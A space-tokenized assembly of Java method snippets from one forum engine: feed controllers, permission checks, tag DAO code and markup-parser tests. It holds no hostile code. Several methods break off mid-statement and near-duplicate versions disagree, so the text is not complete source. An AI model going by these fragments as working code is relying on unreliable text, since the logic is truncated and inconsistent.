getTime ( ) / 1000 , topicListDto . getFromDate ( ) . getTime ( ) / 1000 ) ; assertTrue ( topicListDto . getToDate ( ) = = null ) ; assertEquals ( new Integer ( 20 ) , topicListDto . getLimit ( ) ) ; assertTrue ( topicListDto . getOffset ( ) = = null ) ; } 
public void getUserTopicsFeedTest ( ) throws UserErrorException , TagNotFoundException { User user = mock ( User . class ) ; when ( user . getId ( ) ) . thenReturn ( 12345 ) ; List < Topic > topicList = topicListService . getUserTopicsFeed ( user , 123 , true ) ; assertEquals ( new Integer ( 20 ) , topicListDto . getLimit ( ) ) ; assertEquals ( new Integer ( 123 ) , topicListDto . getOffset ( ) ) ; assertEquals ( TopicListDao . CommitMode . ALL , topicListDto . getCommitMode ( ) ) ; assertEquals ( 12345 , topicListDto . getUserId ( ) ) ; assertTrue ( topicListDto . isUserFavs ( ) ) ; } 
public TagDao getTagDao ( ) throws Exception { TagDao tagDao = mock ( TagDao . class ) ; when ( tagDao . getTagId ( " LOR " ) ) . thenReturn ( 123 ) ; return tagDao ; } 
public < T > void storeToCache ( String key , T value , int expire ) { } @Override public < T > void storeToCache ( String key , T value ) { } } ; return cacheProvider ; } } 
public < T > void storeToCache ( String key , T value ) { } } ; return cacheProvider ; } } 
public void mainTopicsFeedHandler ( ) throws Exception { } } 
public void getUserTopicsFeedWithSectionTest ( ) throws UserErrorException , TagNotFoundException { User user = mock ( User . class ) ; when ( user . getId ( ) ) . thenReturn ( 12345 ) ; List < Topic > topicList = topicListService . getUserTopicsFeed ( user , section1 , 123 , true ) ; assertEquals ( 1 , topicListDto . getSections ( ) . size ( ) ) ; Integer sectionId = topicListDto . getSections ( ) . iterator ( ) . next ( ) ; assertEquals ( new Integer ( 11 ) , sectionId ) ; assertEquals ( new Integer ( 20 ) , topicListDto . getLimit ( ) ) ; assertEquals ( new Integer ( 123 ) , topicListDto . getOffset ( ) ) ; assertEquals ( TopicListDao . CommitMode . ALL , topicListDto . getCommitMode ( ) ) ; assertEquals ( 12345 , topicListDto . getUserId ( ) ) ; assertTrue ( topicListDto . isUserFavs ( ) ) ; } 
public ModelAndView gallery ( HttpServletRequest request , TopicListForm topicListForm , HttpServletResponse response ) throws Exception { topicListForm . setSection ( Section . SECTION_GALLERY ) ; ModelAndView modelAndView = mainTopicsFeedHandler ( request , topicListForm , response ) ; modelAndView . addObject ( " url " , " /gallery/ " ) ; modelAndView . addObject ( " params " , null ) ; return modelAndView ; } 
public ModelAndView forum ( HttpServletRequest request , TopicListForm topicListForm , HttpServletResponse response ) throws Exception { topicListForm . setSection ( Section . SECTION_FORUM ) ; ModelAndView modelAndView = mainTopicsFeedHandler ( request , topicListForm , response ) ; modelAndView . addObject ( " url " , " /forum/lenta " ) ; modelAndView . addObject ( " params " , null ) ; return modelAndView ; } 
public ModelAndView polls ( HttpServletRequest request , TopicListForm topicListForm , HttpServletResponse response ) throws Exception { topicListForm . setSection ( Section . SECTION_POLLS ) ; ModelAndView modelAndView = mainTopicsFeedHandler ( request , topicListForm , response ) ; modelAndView . addObject ( " url " , " /polls/ " ) ; modelAndView . addObject ( " params " , null ) ; return modelAndView ; } 
public ModelAndView news ( HttpServletRequest request , TopicListForm topicListForm , HttpServletResponse response ) throws Exception { topicListForm . setSection ( Section . SECTION_NEWS ) ; ModelAndView modelAndView = mainTopicsFeedHandler ( request , topicListForm , response ) ; modelAndView . addObject ( " url " , " /news/ " ) ; modelAndView . addObject ( " params " , null ) ; return modelAndView ; } 
public ModelAndView galleryGroup ( HttpServletRequest request , TopicListForm topicListForm , @PathVariable ( " group " ) String groupName , HttpServletResponse response ) throws Exception { topicListForm . setSection ( Section . SECTION_GALLERY ) ; return group ( request , topicListForm , groupName , response ) ; } 
public ModelAndView newsGroup ( HttpServletRequest request , TopicListForm topicListForm , @PathVariable ( " group " ) String groupName , HttpServletResponse response ) throws Exception { topicListForm . setSection ( Section . SECTION_NEWS ) ; return group ( request , topicListForm , groupName , response ) ; } 
public ModelAndView pollsGroup ( HttpServletRequest request , TopicListForm topicListForm , @PathVariable ( " group " ) String groupName , HttpServletResponse response ) throws Exception { topicListForm . setSection ( Section . SECTION_POLLS ) ; return group ( request , topicListForm , groupName , response ) ; } 
public ModelAndView galleryArchive ( HttpServletRequest request , TopicListForm topicListForm , @PathVariable String section , @PathVariable int year , @PathVariable int month , HttpServletResponse response ) throws Exception { topicListForm . setSection ( Section . getSection ( section ) ) ; topicListForm . setYear ( year ) ; topicListForm . setMonth ( month ) ; ModelAndView modelAndView = mainTopicsFeedHandler ( request , topicListForm , response ) ; modelAndView . addObject ( " url " , " /gallery/archive/ " + year + '/' + month + '/' ) ; modelAndView . addObject ( " params " , null ) ; return modelAndView ; } 
private void prepareTopicsForPlainOrRss ( HttpServletRequest request , ModelAndView modelAndView , TopicListForm topicListForm , List < Topic > messages ) { boolean rss = topicListForm . getOutput ( ) ! = null & & " rss " . equals ( topicListForm . getOutput ( ) ) ; if ( rss ) { modelAndView . addObject ( 
private ModelAndView group ( HttpServletRequest request , TopicListForm topicListForm , String groupName , HttpServletResponse response ) throws Exception { Section section = sectionService . getSection ( topicListForm . getSection ( ) ) ; Group group = groupDao . getGroup ( section , groupName ) ; topicListForm . setGroup ( group . getId ( ) ) ; ModelAndView modelAndView = mainTopicsFeedHandler ( request , topicListForm , response ) ; modelAndView . addObject ( " url " , group . getUrl ( ) ) ; modelAndView . addObject ( " params " , null ) ; return modelAndView ; } 
public ModelAndView viewAll ( @RequestParam ( value = " section " , required = false , defaultValue = " 0 " ) int sectionId , HttpServletRequest request ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; ModelAndView modelAndView = new ModelAndView ( " view-all " ) ; Section section = null ; if ( sectionId ! = 0 ) { section = sectionService . getSection ( sectionId ) ; modelAndView . addObject ( " section " , section ) ; } Calendar calendar = Calendar . getInstance ( ) ; calendar . setTime ( new Date ( ) ) ; calendar . add ( Calendar . MONTH , - 1 ) ; List < Topic > messages = topicListService . getAllTopicsFeed ( section , calendar . getTime ( ) ) ; modelAndView . addObject ( " messages " , prepareService . prepareMessagesForUser ( messages , request . isSecure ( ) , tmpl . getCurrentUser ( ) ) ) ; List < TopicListDto . DeletedTopic > deleted = topicListService . getDeletedTopicsFeed ( sectionId ) ; modelAndView . addObject ( " deletedTopics " , deleted ) ; modelAndView . addObject ( " sections " , sectionService . getSectionList ( ) ) ; return modelAndView ; } 
public ModelAndView gallery ( HttpServletRequest request , TopicListRequest topicListForm , HttpServletResponse response ) throws Exception { topicListForm . setSection ( Section . SECTION_GALLERY ) ; ModelAndView modelAndView = mainTopicsFeedHandler ( request , topicListForm , response ) ; modelAndView . addObject ( " url " , " /gallery/ " ) ; modelAndView . addObject ( " params " , null ) ; return modelAndView ; } 
public ModelAndView forum ( HttpServletRequest request , TopicListRequest topicListForm , HttpServletResponse response ) throws Exception { topicListForm . setSection ( Section . SECTION_FORUM ) ; ModelAndView modelAndView = mainTopicsFeedHandler ( request , topicListForm , response ) ; modelAndView . addObject ( " url " , " /forum/lenta " ) ; modelAndView . addObject ( " params " , null ) ; return modelAndView ; } 
public ModelAndView polls ( HttpServletRequest request , TopicListRequest topicListForm , HttpServletResponse response ) throws Exception { topicListForm . setSection ( Section . SECTION_POLLS ) ; ModelAndView modelAndView = mainTopicsFeedHandler ( request , topicListForm , response ) ; modelAndView . addObject ( " url " , " /polls/ " ) ; modelAndView . addObject ( " params " , null ) ; return modelAndView ; } 
public ModelAndView news ( HttpServletRequest request , TopicListRequest topicListForm , HttpServletResponse response ) throws Exception { topicListForm . setSection ( Section . SECTION_NEWS ) ; ModelAndView modelAndView = mainTopicsFeedHandler ( request , topicListForm , response ) ; modelAndView . addObject ( " url " , " /news/ " ) ; modelAndView . addObject ( " params " , null ) ; return modelAndView ; } 
public ModelAndView galleryGroup ( HttpServletRequest request , TopicListRequest topicListForm , @PathVariable ( " group " ) String groupName , HttpServletResponse response ) throws Exception { topicListForm . setSection ( Section . SECTION_GALLERY ) ; return group ( request , topicListForm , groupName , response ) ; } 
public ModelAndView newsGroup ( HttpServletRequest request , TopicListRequest topicListForm , @PathVariable ( " group " ) String groupName , HttpServletResponse response ) throws Exception { topicListForm . setSection ( Section . SECTION_NEWS ) ; return group ( request , topicListForm , groupName , response ) ; } 
public ModelAndView pollsGroup ( HttpServletRequest request , TopicListRequest topicListForm , @PathVariable ( " group " ) String groupName , HttpServletResponse response ) throws Exception { topicListForm . setSection ( Section . SECTION_POLLS ) ; return group ( request , topicListForm , groupName , response ) ; } 
public ModelAndView galleryArchive ( HttpServletRequest request , TopicListRequest topicListForm , @PathVariable String section , @PathVariable int year , @PathVariable int month , HttpServletResponse response ) throws Exception { topicListForm . setSection ( Section . getSection ( section ) ) ; topicListForm . setYear ( year ) ; topicListForm . setMonth ( month ) ; ModelAndView modelAndView = mainTopicsFeedHandler ( request , topicListForm , response ) ; modelAndView . addObject ( " url " , " /gallery/archive/ " + year + '/' + month + '/' ) ; modelAndView . addObject ( " params " , null ) ; return modelAndView ; } 
private void prepareTopicsForPlainOrRss ( HttpServletRequest request , ModelAndView modelAndView , TopicListRequest topicListForm , List < Topic > messages ) { boolean rss = topicListForm . getOutput ( ) ! = null & & " rss " . equals ( topicListForm . getOutput ( ) ) ; if ( rss ) { modelAndView . addObject ( 
private ModelAndView group ( HttpServletRequest request , TopicListRequest topicListForm , String groupName , HttpServletResponse response ) throws Exception { Section section = sectionService . getSection ( topicListForm . getSection ( ) ) ; Group group = groupDao . getGroup ( section , groupName ) ; topicListForm . setGroup ( group . getId ( ) ) ; ModelAndView modelAndView = mainTopicsFeedHandler ( request , topicListForm , response ) ; modelAndView . addObject ( " url " , group . getUrl ( ) ) ; modelAndView . addObject ( " params " , null ) ; return modelAndView ; } 
public void getUserTopicsFeedWithSectionAndGroupTest ( ) throws UserErrorException , TagNotFoundException { User user = mock ( User . class ) ; when ( user . getId ( ) ) . thenReturn ( 12345 ) ; List < Topic > topicList = topicListService . getUserTopicsFeed ( user , section1 , group , 123 , true ) ; assertEquals ( 1 , topicListDto . getSections ( ) . size ( ) ) ; Integer sectionId = topicListDto . getSections ( ) . iterator ( ) . next ( ) ; assertEquals ( new Integer ( 11 ) , sectionId ) ; assertEquals ( 111 , topicListDto . getGroup ( ) ) ; assertEquals ( new Integer ( 20 ) , topicListDto . getLimit ( ) ) ; assertEquals ( new Integer ( 123 ) , topicListDto . getOffset ( ) ) ; assertEquals ( TopicListDao . CommitMode . ALL , topicListDto . getCommitMode ( ) ) ; assertEquals ( 12345 , topicListDto . getUserId ( ) ) ; assertTrue ( topicListDto . isUserFavs ( ) ) ; } 
public ModelAndView galleryArchive ( HttpServletRequest request , TopicListRequest topicListForm , @PathVariable String section , @PathVariable int year , @PathVariable int month , HttpServletResponse response ) throws Exception { topicListForm . setSection ( Section . getSection ( section ) ) ; topicListForm . setYear ( year ) ; topicListForm . setMonth ( month ) ; ModelAndView modelAndView = mainTopicsFeedHandler ( request , topicListForm , response ) ; modelAndView . addObject ( " url " , " /gallery/archive/ " + year + '/' + month + '/' ) ; modelAndView . addObject ( " params " , null ) ; return modelAndView ; } 
public boolean isTopicPostingAllowed ( User currentUser ) { if ( restrictTopics = = 0 ) { return true ; } if ( currentUser = = null ) { return false ; } if ( currentUser . isBlocked ( ) ) { return false ; } if ( restrictTopics = = - 1 ) { return currentUser . isModerator ( ) ; 
public boolean isCommentPostingAllowed ( User currentUser ) { if ( ! ( restrictComments ! = 0 ) ) { return true ; } if ( restrictComments = = - 1 ) { return currentUser . isModerator ( ) ; } return currentUser . getScore ( ) > = restrictComments ; } 
public static Group buildGroup ( ResultSet rs ) throws SQLException { int restrict_topics = rs . getInt ( " restrict_topics " ) ; if ( rs . wasNull ( ) ) { restrict_topics = TopicPermissionService . POSTSCORE_UNRESTRICTED ; } Group group = new Group ( rs . getBoolean ( " moderate " ) , rs . getBoolean ( " imagepost " ) , rs . getBoolean ( " vote " ) , rs . getBoolean ( " havelink " ) , rs . getInt ( " section " ) , rs . getString ( " linktext " ) , rs . getString ( " urlname " ) , rs . getString ( " image " ) , restrict_topics , rs . getInt ( " restrict_comments " ) , rs . getInt ( " id " ) , rs . getInt ( " stat1 " ) , rs . getInt ( " stat2 " ) , rs . getInt ( " stat3 " ) , rs . getBoolean ( " resolvable " ) ) ; group . setTitle ( rs . getString ( " title " ) ) ; group . setInfo ( rs . getString ( " info " ) ) ; group . setLongInfo ( rs . getString ( " longinfo " ) ) ; return group ; } 
public boolean isTopicPostingAllowed ( User currentUser ) { if ( restrictTopics = = TopicPermissionService . POSTSCORE_UNRESTRICTED ) { return true ; } if ( currentUser = = null ) { return false ; } if ( currentUser . isBlocked ( ) ) { return false ; } if ( restrictTopics = = TopicPermissionService . POSTSCORE_MODERATORS_ONLY ) { return currentUser . isModerator ( ) ; 
public Group mapRow ( ResultSet resultSet , int i ) throws SQLException { return Group . buildGroup ( resultSet ) ; } 
public Group mapRow ( ResultSet rs , int rowNum ) throws SQLException { return Group . buildGroup ( rs ) ; } 
public boolean isTopicPostingAllowed ( Group group , User currentUser ) { int groupRestriction = group . getTopicRestriction ( ) ; if ( groupRestriction = = TopicPermissionService . POSTSCORE_UNRESTRICTED ) { return true ; } if ( currentUser = = null ) { return false ; } if ( currentUser . isBlocked ( ) ) { return false ; } if ( groupRestriction = = TopicPermissionService . POSTSCORE_MODERATORS_ONLY ) { return currentUser . isModerator ( ) ; 
public boolean isTopicPostingAllowed ( Group group , User currentUser ) { int restriction = getEffectivePostscore ( group ) ; if ( restriction = = TopicPermissionService . POSTSCORE_UNRESTRICTED ) { return true ; } if ( currentUser = = null | | currentUser . isAnonymous ( ) ) { return false ; } if ( currentUser . isBlocked ( ) ) { return false ; } if ( restriction = = TopicPermissionService . POSTSCORE_MODERATORS_ONLY ) { return currentUser . isModerator ( ) ; 
public boolean isDeletable ( Topic topic , User user ) { boolean perm = isDeletableByUser ( topic , user ) ; if ( ! perm & & user . isModerator ( ) ) { perm = isDeletableByModerator ( topic , user ) ; } if ( ! perm ) { return user . isAdministrator ( ) ; } return perm ; } 
private boolean isDeletableByUser ( Topic topic , User user ) { Calendar calendar = Calendar . getInstance ( ) ; calendar . setTime ( new Date ( ) ) ; calendar . add ( Calendar . HOUR_OF_DAY , - 1 ) ; Timestamp hourDeltaTime = new Timestamp ( calendar . getTimeInMillis ( ) ) ; return ( topic . getPostdate ( ) . compareTo ( hourDeltaTime ) > = 0 & & topic . getUid ( ) = = user . getId ( ) ) ; } 
public boolean isDeletable ( ) { return deletable ; } 
public boolean apply ( EditInfoDto input ) { return input . getEditor ( ) ! = message . getUid ( ) ; } 
public User apply ( EditInfoDto input ) { try { return userDao . getUserCached ( input . getEditor ( ) ) ; 
public boolean apply ( EditInfoDto input ) { return input . getEditor ( ) ! = message . getUid ( ) ; } 
public Integer apply ( EditInfoDto input ) { return input . getEditor ( ) ; } 
public void requestValidator ( WebDataBinder binder ) { binder . setValidator ( addTopicRequestValidator ) ; binder . setBindingErrorProcessor ( new ExceptionBindingErrorProcessor ( ) ) ; } 
public static EditInfoDto createFromMessage ( TagService tagService , Topic message , String text ) { EditInfoDto current = new EditInfoDto ( ) ; current . setOldmessage ( text ) ; current . setEditdate ( message . getPostdate ( ) ) ; current . setEditor ( message . getUid ( ) ) ; current . setMsgid ( message . getMessageId ( ) ) ; current . setOldtags ( TagService . toString ( tagService . getMessageTags ( message . getMessageId ( ) ) ) ) ; current . setOldlinktext ( message . getLinktext ( ) ) ; current . setOldurl ( message . getUrl ( ) ) ; return current ; } 
public void requestValidator ( WebDataBinder binder ) { binder . setValidator ( editTopicRequestValidator ) ; binder . setBindingErrorProcessor ( new ExceptionBindingErrorProcessor ( ) ) ; } 
public int getTagId ( String tag ) throws UserErrorException , TagNotFoundException { List < Integer > res = jdbcTemplate . queryForList ( " SELECT id FROM tags_values WHERE value=? AND counter>0 " , Integer . class , tag ) ; if ( res . isEmpty ( ) ) { throw new TagNotFoundException ( ) ; 
public int getTagId ( String tag ) throws UserErrorException , TagNotFoundException { checkTag ( tag ) ; return tagDao . getTagId ( tag ) ; } 
public boolean updateTags ( final int msgId , final List < String > tagList ) { return tagDao . updateTags ( msgId , tagList ) ; } 
public void updateCounters ( final List < String > oldTags , final List < String > newTags ) { tagDao . updateCounters ( oldTags , newTags ) ; } 
private boolean isGoodTag ( String tag ) { return tagRE . matcher ( tag ) . matches ( ) ; } 
public List < Topic > getTopicsFeed ( Section section , Group group , String tag , Integer offset , Integer year , Integer month ) throws UserErrorException , TagNotFoundException { logger . debug ( new StringBuilder ( ) . append ( " TopicListService.getTopicsFeed() " ) . append ( " ; section= " ) . append ( ( section ! = null ) ? section . toString ( ) : " (null) " ) . append ( " ; group= " ) . append ( ( group ! = null ) ? group . toString ( ) : " (null) " ) . append ( " ; tag= " ) . append ( tag ) . append ( " ; offset= " ) . append ( offset ) . append ( " ; year= " ) . append ( year ) . append ( " ; month= " ) . append ( month ) . toString ( ) ) ; TopicListDto topicListDto = new TopicListDto ( ) ; if ( section ! = null ) { topicListDto . getSections ( ) . add ( section . getId ( ) ) ; if ( section . isPremoderated ( ) ) { topicListDto . setCommitMode ( TopicListDao . CommitMode . COMMITED_ONLY ) ; } else { topicListDto . setCommitMode ( TopicListDao . CommitMode . POSTMODERATED_ONLY ) ; } } if ( group ! = null ) { topicListDto . setGroup ( group . getId ( ) ) ; } if ( tag ! = null ) { topicListDto . setTag ( tagService . getTagId ( tag ) ) ; } if ( month ! = null & & year ! = null ) { topicListDto . setDateLimitType ( TopicListDto . DateLimitType . BETWEEN ) ; Calendar calendar = Calendar . getInstance ( ) ; calendar . set ( year , month - 1 , 1 , 0 , 0 , 0 ) ; topicListDto . setFromDate ( calendar . getTime ( ) ) ; calendar . add ( Calendar . MONTH , 1 ) ; topicListDto . setToDate ( calendar . getTime ( ) ) ; } else { topicListDto . setLimit ( 20 ) ; topicListDto . setOffset ( offset > 0 ? offset : null ) ; if ( tag = = null & & group = = null & & ! section . isPremoderated ( ) ) { topicListDto . setDateLimitType ( TopicListDto . DateLimitType . MONTH_AGO ) ; Calendar calendar = Calendar . getInstance ( ) ; calendar . setTime ( new Date ( ) ) ; calendar . add ( Calendar . MONTH , - 6 ) ; topicListDto . setFromDate ( calendar . getTime ( ) ) ; } } return getCachedFeed ( topicListDto ) ; } 
public TagService getTagService ( ) throws Exception { TagService tagService = mock ( TagService . class ) ; when ( tagService . getTagId ( " LOR " ) ) . thenReturn ( 123 ) ; return tagService ; } 
public TagDao getTagDao ( ) throws Exception { TagDao tagDao = mock ( TagDao . class ) ; return tagDao ; } 
private static synchronized int getOrCreateTag ( Connection con , String tag ) throws SQLException { PreparedStatement st2 = con . prepareStatement ( " SELECT id FROM tags_values WHERE value=? " ) ; st2 . setString ( 1 , tag ) ; ResultSet rs = st2 . executeQuery ( ) ; int id ; if ( rs . next ( ) ) { id = rs . getInt ( " id " ) ; } else { PreparedStatement st = con . prepareStatement ( " INSERT INTO tags_values (value) VALUES(?) " ) ; st . setString ( 1 , tag ) ; st . executeUpdate ( ) ; st . close ( ) ; rs = st2 . executeQuery ( ) ; rs . next ( ) ; id = rs . getInt ( " id " ) ; } rs . close ( ) ; st2 . close ( ) ; return id ; } 
public void processRow ( ResultSet rs ) throws SQLException { tags . add ( rs . getString ( " value " ) ) ; } 
public void processRow ( ResultSet rs ) throws SQLException { set . add ( rs . getString ( " value " ) ) ; } 
public void processRow ( ResultSet rs ) throws SQLException { set . add ( rs . getString ( " firstchar " ) ) ; } 
public void processRow ( ResultSet resultSet ) throws SQLException { builder . put ( resultSet . getString ( " value " ) , resultSet . getInt ( " counter " ) ) ; } 
public int getTagId ( String tag ) throws UserErrorException , TagNotFoundException { List < Integer > res = jdbcTemplate . queryForList ( " SELECT id FROM tags_values WHERE value=? AND counter>0 " , Integer . class , tag ) ; if ( res . isEmpty ( ) ) { throw new TagNotFoundException ( ) ; 
public ModelAndView showDefaultTagListHandlertags ( ) { return showTagListHandler ( " " ) ; } 
public ModelAndView showTagListHandler ( @PathVariable String firstLetter ) { ModelAndView modelAndView = new ModelAndView ( " tags " ) ; SortedSet < String > firstLetters = tagService . getFirstLetters ( ) ; modelAndView . addObject ( " firstLetters " , firstLetters ) ; if ( Strings . isNullOrEmpty ( firstLetter ) ) { firstLetter = firstLetters . first ( ) ; } modelAndView . addObject ( " currentLetter " , firstLetter ) ; Map < String , Integer > tags = tagService . getTagsByFirstLetter ( firstLetter ) ; modelAndView . addObject ( " tags " , tags ) ; return modelAndView ; } 
public String oldTagsRedirectHandler ( ) { return " redirect:/tags " ; } 
public void brTest ( ) { Assert . assertEquals ( lorCodeService . parseComment ( " [BR] " , false ) , " <p><br></p> " ) ; } 
public void boldTest ( ) { Assert . assertEquals ( lorCodeService . parseComment ( " [B]hello world[/b] " , false ) , " <p><b>hello world</b></p> " ) ; } 
public void italicTest ( ) { Assert . assertEquals ( lorCodeService . parseComment ( " [I]hello world[/i] " , false ) , " <p><i>hello world</i></p> " ) ; } 
public void strikeoutTest ( ) { Assert . assertEquals ( lorCodeService . parseComment ( " [S]hello world[/s] " , false ) , " <p><s>hello world</s></p> " ) ; } 
public void emphasisTest ( ) { Assert . assertEquals ( lorCodeService . parseComment ( " [STRONG]hello world[/strong] " , false ) , " <p><strong>hello world</strong></p> " ) ; } 
public void quoteTest ( ) { Assert . assertEquals ( lorCodeService . parseComment ( " [quote]hello world[/QUOTE] " , false ) , citeHeader + " <p>hello world</p> " + citeFooter ) ; 
public void quoteParamTest ( ) { Assert . assertEquals ( lorCodeService . parseComment ( " [QUOTE=maxcom]hello world[/quote] " , false ) , citeHeader + " <p><cite>maxcom</cite></p><p>hello world</p> " + citeFooter ) ; 
public void quoteCleanTest ( ) { Assert . assertEquals ( lorCodeService . parseComment ( " [quote][/QUOTE] " , false ) , " " ) ; } 
public void urlTest ( ) { Assert . assertEquals ( lorCodeService . parseComment ( " [URL]http:linux.org.ru[/url] " , false ) , " <p><a href= \" http:linux.org.ru \" >http:linux.org.ru</a></p> " ) ; } 
public void urlParamTest ( ) { Assert . assertEquals ( lorCodeService . parseComment ( " [url=http:linux.org.ru]linux[/URL] " , false ) , " <p><a href= \" http:linux.org.ru \" >linux</a></p> " ) ; } 
public void urlParamWithTagTest ( ) { Assert . assertEquals ( lorCodeService . parseComment ( " [URL=http:linux.org.ru][b]l[/b]inux[/url] " , false ) , " <p><a href= \" http:linux.org.ru \" ><b>l</b>inux</a></p> " ) ; } 
public void urlParamWithTagTest2 ( ) { Assert . assertEquals ( lorCodeService . parseComment ( " [URL=http:linux.org.ru][b]linux[/b][/url] " , false ) , " <p><a href= \" http:linux.org.ru \" ><b>linux</b></a></p> " ) ; } 
public void listTest ( ) { Assert . assertEquals ( lorCodeService . parseComment ( " [LIST][*]one[*]two[*]three[/list] " , false ) , " <ul><li>one</li><li>two</li><li>three</li></ul> " ) ; assertEquals ( " <ul><li>one " + " </li><li>two " + " </li><li>three " + " </li></ul> " , lorCodeService . parseComment ( " [list] n[*]one n[*]two n[*]three n[/LIST] " , false ) ) ; assertEquals ( " <ul><li>one " + 
public void codeTest ( ) { Assert . assertEquals ( " <div class= \" code \" ><pre class= \" no-highlight \" ><code>[list][*]one[*]two[*]three[/LIST]</code></pre></div> " , lorCodeService . parseComment ( " [CODE][list][*]one[*]two[*]three[/LIST][/code] " , false ) ) ; Assert . assertEquals ( " <div class= \" code \" ><pre class= \" no-highlight \" ><code>simple code</code></pre></div> " , lorCodeService . parseComment ( " [code] nsimple code[/CODE] " , false ) ) ; Assert . assertEquals ( " <div class= \" code \" ><pre class= \" no-highlight \" ><code>[LIST][*]one[*]two[*]three[/list]</code></pre></div> " , lorCodeService . parseComment ( " [code] n[LIST][*]one[*]two[*]three[/list][/CODE] " , false ) ) ; 
public void codeCleanTest ( ) { Assert . assertEquals ( " " , lorCodeService . parseComment ( " [code][/CODE] " , false ) ) ; } 
public void codeKnowTest ( ) { Assert . assertEquals ( " <div class= \" code \" ><pre class= \" language-cpp \" ><code>#include &lt;stdio.h&gt;</code></pre></div> " , lorCodeService . parseComment ( " [CODE=cxx]#include <stdio.h>[/code] " , false ) ) ; 
public void codeUnKnowTest ( ) { Assert . assertEquals ( " <div class= \" code \" ><pre class= \" no-highlight \" ><code>#include &lt;stdio.h&gt;</code></pre></div> " , lorCodeService . parseComment ( " [CODE=foo]#include <stdio.h>[/code] " , false ) ) ; 
public void overflow1Test ( ) { Assert . assertEquals ( " <p>ololo</p> " + citeHeader + " <p><i>hz</i></p> " + citeFooter , lorCodeService . parseComment ( " ololo[QUOTE][i]hz[/I][/quote] " , false ) ) ; 
public void spacesTest ( ) { Assert . assertEquals ( " <p>some text</p><p> some again text <a href= \" http:example.com \" >example</a> example</p> " , lorCodeService . parseComment ( " some text n some again text [URL=http:example.com]example[/url] example " , false ) ) ; 
public void userTest ( ) { Assert . assertEquals ( " <p><span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><a style= \" text-decoration: none \" href= \" http:127.0.0.1:8080/people/maxcom/profile \" >maxcom</a></span></p> " , lorCodeService . parseComment ( " [user]maxcom[/USER] " , false ) ) ; Assert . assertEquals ( " <p><span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><s><a style= \" text-decoration: none \" href= \" http:127.0.0.1:8080/people/isden/profile \" >isden</a></s></span></p> " , lorCodeService . parseComment ( " [USER]isden[/USER] " , false ) ) ; Assert . assertEquals ( " <p><s>hizel</s></p> " , lorCodeService . parseComment ( " [user]hizel[/USER] " , false ) ) ; 
public void parserResultTest ( ) { String msg = " [user]hizel[/user][USER]JB[/user][user]maxcom[/USER] " ; Set < User > replier = lorCodeService . getReplierFromMessage ( msg ) ; String html = lorCodeService . parseComment ( msg , true ) ; Assert . assertTrue ( replier . contains ( maxcom ) ) ; Assert . assertTrue ( replier . contains ( JB ) ) ; Assert . assertFalse ( replier . contains ( isden ) ) ; Assert . assertEquals ( " <p><s>hizel</s><span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><a style= \" text-decoration: none \" href= \" https:127.0.0.1:8080/people/JB/profile \" >JB</a></span><span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><a style= \" text-decoration: none \" href= \" https:127.0.0.1:8080/people/maxcom/profile \" >maxcom</a></span></p> " , html ) ; } 
public void cut4Test ( ) { Assert . assertEquals ( " <div id= \" cut0 \" ><p>test</p></div><div id= \" cut1 \" ><p>test</p></div> " , lorCodeService . parseTopic ( " [cut] ntest[/CUT][cut]test[/cut] " , false ) ) ; 
public void urlParameterQuotesTest ( ) { assertEquals ( " <p><a href= \" http:www.example.com \" >example</a></p> " , lorCodeService . parseComment ( " [url= \" http:www.example.com]example[/URL] " , false ) ) ; assertEquals ( " <p><a href= \" http:www.example.com \" >example</a></p> " , lorCodeService . parseComment ( " [url= \" http:www.example.com \" ]example[/url] " , false ) ) ; assertEquals ( " <p><a href= \" http:www.example.com \" >example</a></p> " , lorCodeService . parseComment ( " [URL='http:www.example.com']example[/url] " , false ) ) ; assertEquals ( " <p><a href= \" http:www.example.com \" >example</a></p> " , lorCodeService . parseComment ( " [URL='http:www.example.com]example[/url] " , false ) ) ; 
public void autoLinksInList ( ) { assertEquals ( " <ul><li><a href= \" http:www.example.com \" >http:www.example.com</a></li><li>sure</li><li>profit!</li></ul> " , lorCodeService . parseComment ( " [list][*]www.example.com[*]sure[*]profit![/LIST] " , false ) ) ; 
public ModelAndView showDefaultTagListHandlertags ( HttpServletRequest request ) throws TagNotFoundException { return showTagListHandler ( " " , request ) ; } 
public ModelAndView showTagListHandler ( @PathVariable String firstLetter , HttpServletRequest request ) throws TagNotFoundException { ModelAndView modelAndView = new ModelAndView ( " tags " ) ; Template tmpl = Template . getTemplate ( request ) ; SortedSet < String > firstLetters = tagService . getFirstLetters ( ! tmpl . isModeratorSession ( ) ) ; modelAndView . addObject ( " firstLetters " , firstLetters ) ; if ( Strings . isNullOrEmpty ( firstLetter ) ) { firstLetter = firstLetters . first ( ) ; } modelAndView . addObject ( " currentLetter " , firstLetter ) ; Map < String , Integer > tags = tagService . getTagsByFirstLetter ( firstLetter , ! tmpl . isModeratorSession ( ) ) ; if ( tags . size ( ) = = 0 ) { throw new TagNotFoundException ( " Tag list is empty " ) ; } modelAndView . addObject ( " tags " , tags ) ; return modelAndView ; } 
protected ModelAndView doResolveException ( HttpServletRequest request , HttpServletResponse response , Object handler , Exception ex ) { ModelAndView modelAndView = super . doResolveException ( request , response , handler , ex ) ; if ( modelAndView = = null ) { modelAndView = new ModelAndView ( " error " ) ; } modelAndView . addObject ( " exception " , ex ) ; return modelAndView ; } 
protected ModelAndView doResolveException ( HttpServletRequest request , HttpServletResponse response , Object handler , Exception ex ) { ModelAndView modelAndView = super . doResolveException ( request , response , handler , ex ) ; if ( modelAndView = = null ) { modelAndView = new ModelAndView ( " error " ) ; prepareModelForCommonException ( modelAndView , request , ex ) ; } modelAndView . addObject ( " exception " , ex ) ; return modelAndView ; } 
